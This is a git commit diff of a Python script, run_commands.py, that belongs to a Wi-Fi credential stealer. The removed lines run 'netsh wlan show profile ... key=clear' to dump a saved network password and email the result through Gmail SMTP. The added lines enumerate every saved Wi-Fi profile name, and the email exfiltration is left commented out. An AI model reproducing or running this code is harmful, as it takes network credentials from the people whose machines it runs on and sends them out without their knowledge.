0f6f8659b0e16a53cc4ccc9d98664b07198b1964
0x1tsjusthicham <hicham.ezzamzami@gmail.com>
2024-10-06 12:45:46 -0400

    Get All Network Name That User COnnect to

--- run_commands.py
+++ run_commands.py
@@ -1,4 +1,4 @@
-import subprocess, smtplib
+import subprocess, smtplib, re
 
 def send_mail(email, password, message):
     server = smtplib.SMTP("smtp.gmail.com", 587)
@@ -7,6 +7,9 @@ def send_mail(email, password, message):
     server.sendmail(email, email, message)
     server.quit()
 
-commands = "netsh wlan show profile Orange_5G key=clear"
-result = subprocess.check_output(commands, shell=True)
-send_mail("", "", message=result)
+commands = "netsh wlan show profile"
+networks = subprocess.check_output(commands, shell=True)
+network_name_lists = re.findall(b"(?:Profile\s*:\s)(.*)", networks)
+for network_name in network_name_lists:
+    print(network_name.decode("UTF-8"))
+# send_mail("", "", message=result)
